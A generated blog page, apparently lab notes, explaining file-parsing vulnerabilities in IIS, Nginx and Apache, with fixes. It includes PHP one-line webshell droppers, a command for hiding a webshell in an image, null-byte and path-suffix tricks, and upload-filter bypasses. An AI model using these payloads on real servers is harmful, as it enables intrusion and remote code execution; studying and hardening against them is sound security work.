@@ -1,0 +1,911 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Web安全,一天一实验之合天网安,">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/111.png?v=5.1.1">
+
+
+
+
+
+
+<meta name="description" content="IIS与Nginx解析漏洞IIS5.x-IIS6.x解析漏洞">
+<meta name="keywords" content="Web安全,一天一实验之合天网安">
+<meta property="og:type" content="article">
+<meta property="og:title" content="解析漏洞">
+<meta property="og:url" content="http://yoursite.com/2017/10/26/一天一实验-解析漏洞/index.html">
+<meta property="og:site_name" content="Yokeen&#39;s blog">
+<meta property="og:description" content="IIS与Nginx解析漏洞IIS5.x-IIS6.x解析漏洞">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-02-06T05:18:46.765Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="解析漏洞">
+<meta name="twitter:description" content="IIS与Nginx解析漏洞IIS5.x-IIS6.x解析漏洞">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: "",
+      labels: ""
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/10/26/一天一实验-解析漏洞/">
+
+
+
+
+
+  <title>解析漏洞 | Yokeen's blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?12246f7e36b6d790ccbbfabf73da926b";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Yokeen's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/26/一天一实验-解析漏洞/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Yokeen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/beiy.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yokeen's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">解析漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-26T09:20:24+08:00">
+                2017-10-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/10/26/一天一实验-解析漏洞/" class="leancloud_visitors" data-flag-title="解析漏洞">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="IIS与Nginx解析漏洞"><a href="#IIS与Nginx解析漏洞" class="headerlink" title="IIS与Nginx解析漏洞"></a>IIS与Nginx解析漏洞</h1><h2 id="IIS5-x-IIS6-x解析漏洞"><a href="#IIS5-x-IIS6-x解析漏洞" class="headerlink" title="IIS5.x-IIS6.x解析漏洞"></a>IIS5.x-IIS6.x解析漏洞</h2><a id="more"></a>
+<p>使用iis5.x-6.x版本的服务器，大多为Windows server 2003，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。<br>形式：<a href="http://www.xxx.com/xx.asp;.jpg" target="_blank" rel="noopener">www.xxx.com/xx.asp;.jpg</a><br>原理：服务器默认不解析；后边的内容，因此xx.asp;1.jpg就被解析为asp文件了<br>方法一、<br>IIS6.0默认的可执行文件包含：<br>    xx.asp<br>    xx.asa<br>    xx.cer<br>    xx.cdx<br>方法二、<br>有一个x.asp的目录，里边包含一个图片文件也就是    x.asp/x.jpg 这个图片文件会被直接解析为asp文件<br>方法三、<br>当建立<em>.asa、</em>.asp格式的文件夹时，其目录下的文件都被当作asp文件来解析<br>方法四、<br>只能上传html格式，上传xx.asp;.html 进行绕过，访问的时候也访问这个路径<br>修补方案：做好权限设置，限制用户创建文件夹；编写正则，组织上传此类型的文件名。</p>
+<h2 id="IIS7-0-7-5-Nginx-lt-8-03"><a href="#IIS7-0-7-5-Nginx-lt-8-03" class="headerlink" title="IIS7.0/7.5/Nginx&lt;8.03"></a>IIS7.0/7.5/Nginx&lt;8.03</h2><p>IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。</p>
+<p>形式：在默认Fast-CGI开启的状况，上传一个名字为dama.jpg，内容为&lt;?php fputs(fopen(‘shell.php’,’w’),’&lt;?php @eval($_POST[cmd]);?&gt;’;?)&gt;  的文件，然后访问dama.jpg/.php，在这个目录下就会生成一句话木马shell.php。</p>
+<h2 id="Ngonx-lt-8-03空字节代码执行漏洞"><a href="#Ngonx-lt-8-03空字节代码执行漏洞" class="headerlink" title="Ngonx&lt;8.03空字节代码执行漏洞"></a>Ngonx&lt;8.03空字节代码执行漏洞</h2><h3 id="影响版本：0-5-，0-6-，0-7-lt-0-7-65，0-8-lt-0-8-37"><a href="#影响版本：0-5-，0-6-，0-7-lt-0-7-65，0-8-lt-0-8-37" class="headerlink" title="影响版本：0.5.，0.6.，0.7 &lt;= 0.7.65，0.8 &lt;= 0.8.37"></a>影响版本：0.5.，0.6.，0.7 &lt;= 0.7.65，0.8 &lt;= 0.8.37</h3><h3 id="形式：Nginx-在图片中嵌入PHP代码然后访问-ma-jpg-00-php-从而来执行其中的代码。"><a href="#形式：Nginx-在图片中嵌入PHP代码然后访问-ma-jpg-00-php-从而来执行其中的代码。" class="headerlink" title="形式：Nginx 在图片中嵌入PHP代码然后访问 ma.jpg%00.php  从而来执行其中的代码。"></a>形式：Nginx 在图片中嵌入PHP代码然后访问 ma.jpg%00.php  从而来执行其中的代码。</h3><h1 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h1><p>Apache解析文件的规则是从右到左开始判断解析，如果后缀名为不可识别的文件解析，就再往左判断。<br>比如test.php.php123，php123这个后缀是apache不可识别解析的，所以这个文件会被解析为test.php执行。但是我们要上传一个合法的后缀，test.php.rar.nihao.jpg.png（把你熟悉的后缀都写上，然后去测试哪个是合法的后缀）<br>配置问题也会导致漏洞：<br>①如果在apache的conf文件里有这样一行配置，AddHandler php5-script.php，这是只要文件名里包含.php不管文件名是哪样都会以php执行。<br>②如果在apache的conf文件里有这样一行配置，AddType application/x-httpd-php .jpg 即使扩展名是jpg，一样可以以php方式执行。<br>（这个问题在nginx一样存在，就是在配置文件cgi中设置，把某些类型当作某些类型来执行。可以当作后门形式。）</p>
+<h2 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h2><h3 id="①apache配置文件，禁止-php-这样的文件执行，配置文件里边加入"><a href="#①apache配置文件，禁止-php-这样的文件执行，配置文件里边加入" class="headerlink" title="①apache配置文件，禁止.php.这样的文件执行，配置文件里边加入"></a>①apache配置文件，禁止.php.这样的文件执行，配置文件里边加入</h3><p><files ~="" “.(php.|php3.)”=""><br>Order Allow,Deny<br>Deny from all<br>&lt;//Files&gt;</files></p>
+<h3 id="②用伪静态能解决这个问题，重写类似-php-这类文件，打开apache的httpd-conf找到LoadModule-rewrite-module-modules-mod-rewrite-so"><a href="#②用伪静态能解决这个问题，重写类似-php-这类文件，打开apache的httpd-conf找到LoadModule-rewrite-module-modules-mod-rewrite-so" class="headerlink" title="②用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so"></a>②用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so</h3><p>把#去掉，重启apache，在网站根目录下简历.htaccess文件，代码如下</p>
+<p><ifmodule mod_rewrite.c=""><br>RewriteEngine On<br>RewriteRule .(php.|php3.) /index.php<br>RewriteRule .(pHp.|pHp3.) /index.php<br>RewriteRule .(phP.|phP3.) /index.php<br>RewriteRule .(Php.|Php3.) /index.php<br>RewriteRule .(PHp.|PHp3.) /index.php<br>RewriteRule .(PhP.|PhP3.) /index.php<br>RewriteRule .(pHP.|pHP3.) /index.php<br>RewriteRule .(PHP.|PHP3.) /index.php<br>&lt;//IfModule&gt;</ifmodule></p>
+<h3 id="③其实针对这个，一般都是上传目录，你在apache配置文件中针对上传目录做一个正则，然后禁止-重写某些文件执行也是可以的。"><a href="#③其实针对这个，一般都是上传目录，你在apache配置文件中针对上传目录做一个正则，然后禁止-重写某些文件执行也是可以的。" class="headerlink" title="③其实针对这个，一般都是上传目录，你在apache配置文件中针对上传目录做一个正则，然后禁止/重写某些文件执行也是可以的。"></a>③其实针对这个，一般都是上传目录，你在apache配置文件中针对上传目录做一个正则，然后禁止/重写某些文件执行也是可以的。</h3><hr>
+<p>如果在Apache中，.htaccess是可以被执行，可以被上传。尝试在.htaccess中写入</p>
+<p><filesmatch "phpmuma.jpg"="">SetHandler application/x-httpd-php &lt;//FilesMatch&gt;<br>然后上传shell.jpg的木马，这样就可以被解析为PHP文件。</filesmatch></p>
+<h1 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h1><p>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。<br>当访问<a href="http://www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。<br>如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了<br>形式：<br>xxx.com/1.jpg/1.php   （1.php是不存在的）<br>xxx.com/1.jpg/.php<br>xxx.com/1.jpg%00.php<br>xxx.com/1.jpg%20\0.php<br>另外一种手法：上传一个名字为test.jpg，以下内容的文件,然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。<br>&lt;?PHP fputs(fopen(‘shell.php’,’w’),’&lt;?php eval($_POST[cmd])?&gt;’);?&gt;<br>新建图马<br>copy 1.jpg/b + 1.php/a 2.jpg<br>在论坛选择发帖，将图马上传，找到图片真是地址，访问图片地址<br>xxx.jpg/.php 菜刀连接，Getshell<br>加固策略</p>
+<pre><code>1. cgi.fix_pathubfi设为1
+2. 图片上传目录不给执行权限
+3. 禁用危险函数
+4. 禁用发帖上传图片功能
+5. 升级php-fpm，nginx
+</code></pre><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案:"></a>修复方案:</h2><p>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;<br>2.在Nginx配置文件中添加以下代码：<br>if ( $fastcgi_script_name ~ ..<em>/.</em>php ) {<br>return 403;<br>}<br>到类似test.jpg/a.php的URL时，将返回403错误代码<br>搞培训的时候也遇到这种情况就是在apache那一块说了的，在CGI文件中添加对应的扩展名，就会让此扩展名按照相应的类型来解析，也算是一个后门。<br>黑名单绕过</p>
+<pre><code>1. xxx.php -&gt; PHP,Php…  php空格、php3
+2. 文件名大小写绕过
+</code></pre><p>白名单绕过<br>其他</p>
+<pre><code>1. 在Windows环境下，dama.jpg[空格]   或  dama.jpg.  这两类文件都是不允许存在的，如果这样命名，Windows会默认取出空格和点。我们可以通过抓包，加上这样的格式来绕过黑名单，然后让系统帮我们把不合法的后缀消除
+2. 绕过MIME文件类型检测
+    a. 上传xxx.php，拦截数据包将MIME类型：Content-Type：application/octet-stream修改为Content-Type：image/pjpeg 就可上传成功
+3. 绕过文件内容检测
+    a. 上传1.jpg照片，在数据包中修改为1.php，在图片数据末尾空几个空格然后写上一句话木马的内容，上传即可进行连接。
+4. 双文件上传
+    a. 加一行文件名按钮，name标签不同，第一个上传图片，第二个上传木马
+5. WebDAV [一种基于HTTP1.1的通信协议，扩展了一些HTTP请求方法]
+    a. 抓包PUT上传
+6. PHP文件修改文件头。[…这个是直接在文本文件的开头加上gif89a]
+7. 00截断的条件，PHP&lt;5.3.4,GPC=off，否则%00会被转义为\0
+8. 另一种截断方式：多个/截断
+    a. 条件PHP&lt;5.0
+    b. Windows 240个.或者./可以截断
+</code></pre><p>linux 2038个/.可以截断</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/wechat.png" alt="Yokeen WeChat Pay">
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/alipay.jpg" alt="Yokeen Alipay">
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+            <a href="/tags/一天一实验之合天网安/" rel="tag"># 一天一实验之合天网安</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/25/一天一实验-合天网安-使用UPX对软件加壳/" rel="next" title="壳">
+                <i class="fa fa-chevron-left"></i> 壳
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/10/31/一天一实验-合天-Wireshark的使用/" rel="prev" title="Wireshark查看TCP三次握手以及流式图片恢复">
+                Wireshark查看TCP三次握手以及流式图片恢复 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/beiy.jpg" alt="Yokeen">
+          <p class="site-author-name" itemprop="name">Yokeen</p>
+           
+              <p class="site-description motion-element" itemprop="description">无所畏惧，勇往直前</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">42</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Yokeen" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.test404.com" title="Test404'Blog" target="_blank">Test404'Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.lmxspace.com" title="l1nk3r's blog" target="_blank">l1nk3r's blog</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#IIS与Nginx解析漏洞"><span class="nav-number">1.</span> <span class="nav-text">IIS与Nginx解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS5-x-IIS6-x解析漏洞"><span class="nav-number">1.1.</span> <span class="nav-text">IIS5.x-IIS6.x解析漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS7-0-7-5-Nginx-lt-8-03"><span class="nav-number">1.2.</span> <span class="nav-text">IIS7.0/7.5/Nginx&lt;8.03</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ngonx-lt-8-03空字节代码执行漏洞"><span class="nav-number">1.3.</span> <span class="nav-text">Ngonx&lt;8.03空字节代码执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#影响版本：0-5-，0-6-，0-7-lt-0-7-65，0-8-lt-0-8-37"><span class="nav-number">1.3.1.</span> <span class="nav-text">影响版本：0.5.，0.6.，0.7 &lt;= 0.7.65，0.8 &lt;= 0.8.37</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#形式：Nginx-在图片中嵌入PHP代码然后访问-ma-jpg-00-php-从而来执行其中的代码。"><span class="nav-number">1.3.2.</span> <span class="nav-text">形式：Nginx 在图片中嵌入PHP代码然后访问 ma.jpg%00.php  从而来执行其中的代码。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Apache解析漏洞"><span class="nav-number">2.</span> <span class="nav-text">Apache解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#修复方案："><span class="nav-number">2.1.</span> <span class="nav-text">修复方案：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#①apache配置文件，禁止-php-这样的文件执行，配置文件里边加入"><span class="nav-number">2.1.1.</span> <span class="nav-text">①apache配置文件，禁止.php.这样的文件执行，配置文件里边加入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#②用伪静态能解决这个问题，重写类似-php-这类文件，打开apache的httpd-conf找到LoadModule-rewrite-module-modules-mod-rewrite-so"><span class="nav-number">2.1.2.</span> <span class="nav-text">②用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#③其实针对这个，一般都是上传目录，你在apache配置文件中针对上传目录做一个正则，然后禁止-重写某些文件执行也是可以的。"><span class="nav-number">2.1.3.</span> <span class="nav-text">③其实针对这个，一般都是上传目录，你在apache配置文件中针对上传目录做一个正则，然后禁止/重写某些文件执行也是可以的。</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Nginx解析漏洞"><span class="nav-number">3.</span> <span class="nav-text">Nginx解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#修复方案"><span class="nav-number">3.1.</span> <span class="nav-text">修复方案:</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yokeen</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("jwmoWLlH6Y6Lhn3O89mgQzzU-gzGzoHsz", "d2eM2PNMsQCyGqPbC5aaIyuz");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
